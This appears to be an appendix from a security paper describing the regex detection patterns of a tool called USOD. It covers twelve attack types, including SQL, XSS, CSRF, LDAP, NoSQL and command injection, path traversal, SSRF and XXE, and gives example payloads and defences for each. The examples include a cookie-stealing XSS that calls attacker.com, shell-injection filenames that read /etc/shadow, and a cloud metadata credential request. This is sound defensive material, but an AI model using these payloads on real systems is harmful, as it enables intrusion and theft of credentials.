This appendix provides comprehensive details on the 12 attack pattern types detected by USOD's pattern-based security detection engine. For each attack type, we present the detection patterns, example attacks, real-world context, and defense mechanisms.

\subsection{SQL Injection}

SQL injection attacks manipulate database queries by injecting malicious SQL code through user input fields. USOD detects SQL injection using 12 regular expression patterns:

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=SQL Injection Detection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
SQL_INJECTION: [
  /union\s+select/i,           // UNION-based injection
  /select\s+.*\s+from/i,       // SELECT statement injection
  /drop\s+table/i,             // DROP TABLE attack
  /insert\s+into/i,            // INSERT injection
  /update\s+.*\s+set/i,        // UPDATE injection
  /delete\s+from/i,            // DELETE injection
  /or\s+1\s*=\s*1/i,          // Tautology attack
  /'\s*or\s*'.*'\s*=\s*'/i,  // String-based tautology
  /--\s*$/i,                   // SQL comment injection
  /\/\*.*\*\//i,              // Block comment injection
  /xp_cmdshell/i,             // MSSQL command execution
  /sp_executesql/i            // MSSQL dynamic SQL
]
\end{lstlisting}

\subsubsection{Example Attacks}

\begin{itemize}
    \item \textbf{Classic Tautology}: \texttt{username: admin' OR '1'='1} - Always evaluates to true, bypassing authentication
    \item \textbf{UNION-Based}: \texttt{id: 1' UNION SELECT username,password FROM users--} - Extracts data from other tables
    \item \textbf{Blind Injection}: \texttt{id: 1' AND 1=1--} - Infers data through boolean responses
    \item \textbf{Command Execution}: \texttt{'; EXEC xp\_cmdshell('net user');--} - Executes system commands
\end{itemize}

\subsubsection{Real-World Impact}

SQL injection has enabled some of the most significant data breaches in history, including the 2017 Equifax breach (147 million records) and numerous e-commerce compromises. OWASP consistently ranks SQL injection in the top 10 web vulnerabilities.

\subsubsection{Defense Mechanisms}

Beyond pattern detection, comprehensive SQL injection defense includes:
\begin{itemize}
    \item Parameterized queries (prepared statements) preventing SQL code injection
    \item Input validation rejecting suspicious characters and keywords
    \item Least-privilege database accounts limiting damage from successful injection
    \item Web Application Firewalls (WAF) providing additional detection layer
\end{itemize}

\subsection{Cross-Site Scripting (XSS)}

XSS attacks inject malicious JavaScript into web pages viewed by other users, enabling session hijacking, credential theft, and defacement.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=XSS Detection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
XSS: [
  /<script[^>]*>.*?<\/script>/gi,  // <script> tag injection
  /javascript:/gi,                  // javascript: protocol
  /on\w+\s*=/gi,                   // Event handler injection
  /<iframe[^>]*>.*?<\/iframe>/gi,  // <iframe> injection
  /<object[^>]*>.*?<\/object>/gi,  // <object> injection
  /<embed[^>]*>.*?<\/embed>/gi,    // <embed> injection
  /<link[^>]*>.*?<\/link>/gi,      // <link> injection
  /<meta[^>]*>.*?<\/meta>/gi,      // <meta> injection
  /<style[^>]*>.*?<\/style>/gi,    // <style> injection
  /expression\s*\(/gi,              // CSS expression injection
  /url\s*\(/gi,                     // CSS url injection
  /@import/gi                       // CSS @import injection
]
\end{lstlisting}

\subsubsection{XSS Types and Examples}

\textbf{Reflected XSS}: Attack payload reflected in immediate response
\begin{verbatim}
URL: https://example.com/search?q=<script>
     alert(document.cookie)</script>
\end{verbatim}

\textbf{Stored XSS}: Attack payload stored in database and served to multiple users
\begin{verbatim}
Comment: <script>
  fetch('https://attacker.com/?cookie='+document.cookie)
</script>
\end{verbatim}

\textbf{DOM-Based XSS}: Client-side JavaScript processes malicious input
\begin{verbatim}
#fragment=<img src=x onerror=alert('XSS')>
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Output encoding (HTML entity encoding) for all user-generated content
    \item Content Security Policy (CSP) headers restricting script sources
    \item HttpOnly and Secure flags on session cookies preventing JavaScript access
    \item Input validation and sanitization removing dangerous characters
\end{itemize}

\subsection{Cross-Site Request Forgery (CSRF)}

CSRF attacks trick users into executing unwanted actions on authenticated web applications, exploiting the browser's automatic inclusion of authentication cookies.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=CSRF Detection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
CSRF: [
  /<form[^>]*action[^>]*>/gi,   // HTML form injection
  /<img[^>]*src[^>]*>/gi,       // Image-based CSRF
  /<iframe[^>]*src[^>]*>/gi     // Iframe-based CSRF
]
\end{lstlisting}

\subsubsection{Example Attacks}

\textbf{Form-Based CSRF}:
\begin{verbatim}
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
\end{verbatim}

\textbf{Image-Based CSRF}:
\begin{verbatim}
<img src="https://bank.com/transfer?to=attacker&amount=10000">
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item CSRF tokens: Unpredictable values required with state-changing requests
    \item SameSite cookie attribute preventing cross-site cookie transmission
    \item Referer/Origin header validation verifying request source
    \item Re-authentication for sensitive operations
\end{itemize}

\subsection{LDAP Injection}

LDAP injection attacks manipulate LDAP queries used for authentication and directory services, potentially enabling authentication bypass and data exfiltration.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=LDAP Injection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
LDAP_INJECTION: [
  /\*\)/gi,         // Wildcard injection
  /\)/gi,           // Parenthesis manipulation
  /\(/gi,           // Parenthesis manipulation
  /&/gi,            // AND operator injection
  /\|/gi,           // OR operator injection
  /!/gi,            // NOT operator injection
  /cn=/gi,          // Common Name attribute
  /ou=/gi,          // Organizational Unit
  /dc=/gi,          // Domain Component
  /objectClass=/gi, // Object class filter
  /userPassword=/gi,// Password attribute
  /uid=/gi          // User ID attribute
]
\end{lstlisting}

\subsubsection{Example Attacks}

\textbf{Authentication Bypass}:
\begin{verbatim}
username: *)(uid=*))(|(uid=*
password: anything
\end{verbatim}
This manipulates the LDAP query to always return true.

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Input sanitization escaping LDAP special characters
    \item Parameterized LDAP queries when supported by the directory service
    \item Input validation allowing only expected characters
    \item Least privilege for LDAP service accounts
\end{itemize}

\subsection{NoSQL Injection}

NoSQL injection targets MongoDB, CouchDB, and other NoSQL databases by injecting malicious operators into queries.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=NoSQL Injection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
NOSQL_INJECTION: [
  /\$where/gi,      // JavaScript execution
  /\$ne/gi,         // Not equal operator
  /\$gt/gi,         // Greater than
  /\$lt/gi,         // Less than
  /\$regex/gi,      // Regex matching
  /\$exists/gi,     // Field existence
  /\$in/gi,         // In array
  /\$nin/gi,        // Not in array
  /\$or/gi,         // OR condition
  /\$and/gi,        // AND condition
  /\$not/gi,        // NOT operator
  /\$nor/gi,        // NOR operator
  /\$all/gi,        // All array elements
  /\$elemMatch/gi,  // Element matching
  /\$size/gi,       // Array size
  /\$type/gi        // Field type
]
\end{lstlisting}

\subsubsection{Example Attacks}

\textbf{Authentication Bypass}:
\begin{verbatim}
POST /login
{"username": {"$ne": null}, "password": {"$ne": null}}
\end{verbatim}
This query matches any document where username and password exist.

\textbf{JavaScript Injection}:
\begin{verbatim}
{"$where": "this.password.match(/^admin.*/)||'1'=='1'"}
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item MongoDB sanitization libraries (mongo-sanitize, express-mongo-sanitize)
    \item Type checking ensuring inputs match expected types
    \item Disabling \$where and mapReduce for untrusted input
    \item Schema validation enforcing strict document structure
\end{itemize}

\subsection{Command Injection}

Command injection exploits applications that execute system commands, potentially granting attackers shell access.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=Command Injection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
COMMAND_INJECTION: [
  /;\s*ls/gi,       // List directory
  /;\s*cat/gi,      // Read file
  /;\s*rm/gi,       // Remove file
  /;\s*whoami/gi,   // Current user
  /;\s*pwd/gi,      // Current directory
  /;\s*netstat/gi,  // Network connections
  /\|\s*ls/gi,      // Pipe to ls
  /`.*`/gi,         // Command substitution
  /\$\(.*\)/gi,     // Command substitution
  /&&\s*ls/gi       // Command chaining
]
\end{lstlisting}

\subsubsection{Example Attacks}

\begin{verbatim}
filename: report.pdf; cat /etc/passwd
filename: report.pdf && whoami
filename: `cat /etc/shadow`
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Avoid system command execution when possible
    \item Use language-specific libraries instead of shell commands
    \item Strict input validation with whitelists
    \item Parameterized command execution with argument arrays
\end{itemize}

\subsection{Path Traversal}

Path traversal attacks access files outside intended directories by manipulating file paths.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=Path Traversal Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
PATH_TRAVERSAL: [
  /\.\.\/\.\.\/\.\.\//gi,        // Unix traversal
  /\.\.\\\.\.\\\.\.\\/gi,        // Windows traversal
  /\.\.%2f\.\.%2f\.\.%2f/gi,     // URL encoded
  /\.\.%5c\.\.%5c\.\.%5c/gi,     // URL encoded backslash
  /\.\.%252f\.\.%252f/gi,        // Double URL encoded
  /\.\.%c0%af\.\.%c0%af/gi,      // Unicode encoded
  /\.\.%2e%2e%2f/gi              // Mixed encoding
]
\end{lstlisting}

\subsubsection{Example Attacks}

\begin{verbatim}
file: ../../../etc/passwd
file: ..\..\..\..\windows\system32\config\sam
file: ..%2f..%2f..%2fetc%2fpasswd
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Canonicalize paths and validate they remain within allowed directories
    \item Chroot jails or containerization limiting filesystem access
    \item Whitelist allowed files rather than blacklisting traversal patterns
\end{itemize}

\subsection{Server-Side Request Forgery (SSRF)}

SSRF attacks trick servers into making requests to unintended locations, potentially accessing internal resources or cloud metadata services.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=SSRF Detection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
SSRF: [
  /http:\/\/localhost/gi,
  /http:\/\/127\.0\.0\.1/gi,
  /http:\/\/169\.254\.169\.254/gi,  // AWS metadata
  /http:\/\/metadata\.googleapis\.com/gi, // GCP metadata
  /file:\/\/\/etc\/passwd/gi,
  /gopher:\/\//gi,
  /dict:\/\//gi
]
\end{lstlisting}

\subsubsection{Example Attacks}

\begin{verbatim}
url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
url: http://localhost:6379  (Redis)
url: file:///etc/passwd
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Whitelist allowed domains and protocols
    \item Block requests to private IP ranges and localhost
    \item Network segmentation preventing access to internal services
    \item Disable unused URL schemes (gopher, dict, file)
\end{itemize}

\subsection{XML External Entity (XXE)}

XXE attacks exploit XML parsers that process external entity references, potentially exposing files or executing denial-of-service attacks.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=XXE Detection Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
XXE: [
  /<!DOCTYPE/gi,     // DOCTYPE declaration
  /<!ENTITY/gi,      // Entity definition
  /SYSTEM/gi,        // External entity
  /PUBLIC/gi,        // Public entity
  /%[a-zA-Z0-9_]+;/gi, // Parameter entity reference
  /&[a-zA-Z0-9_]+;/gi, // Entity reference
  /file:\/\/\//gi    // File protocol
]
\end{lstlisting}

\subsubsection{Example Attacks}

\begin{verbatim}
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
\end{verbatim}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Disable DTD processing in XML parsers
    \item Disable external entity resolution
    \item Use JSON instead of XML when possible
    \item Keep XML libraries updated
\end{itemize}

\subsection{Information Disclosure}

Information disclosure attacks extract sensitive system information through error messages, debug output, or exposed endpoints.

\subsubsection{Detection Patterns}

\begin{lstlisting}[language=JavaScript, caption=Information Disclosure Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
INFORMATION_DISCLOSURE: [
  /version/i, /build/i, /release/i,
  /debug/i, /test/i, /staging/i,
  /localhost/i, /127\.0\.0\.1/i,
  /password/i, /key/i, /token/i,
  /api_key/i, /access_key/i
]
\end{lstlisting}

\subsubsection{Defense Mechanisms}

\begin{itemize}
    \item Generic error messages hiding implementation details
    \item Disable debug modes in production
    \item Remove version information from HTTP headers
    \item Implement proper access controls on administrative endpoints
\end{itemize}

\subsection{Brute Force Detection}

While not an injection attack, USOD detects brute force attempts through behavioral analysis:

\begin{lstlisting}[language=JavaScript, caption=Brute Force Configuration, basicstyle=\footnotesize\ttfamily, breaklines=true]
SECURITY_CONFIG = {
  BRUTE_FORCE_THRESHOLD: 5,  // Failed attempts
  BRUTE_FORCE_WINDOW: 15 * 60 * 1000, // 15 minutes
  IP_BLOCK_DURATION: 60 * 60 * 1000, // 1 hour
  MAX_ATTEMPTS_PER_IP: 20
}
\end{lstlisting}

\subsection{Suspicious Activity Detection}

Detects reconnaissance and enumeration attempts:

\begin{lstlisting}[language=JavaScript, caption=Suspicious Activity Patterns, basicstyle=\footnotesize\ttfamily, breaklines=true]
SUSPICIOUS: [
  /admin/i, /administrator/i, /root/i,
  /test/i, /debug/i, /config/i,
  /backup/i, /passwd/i, /shadow/i
]
\end{lstlisting}

These comprehensive detection patterns enable USOD to identify and block a wide range of attack types in real-time, providing robust application-layer security.

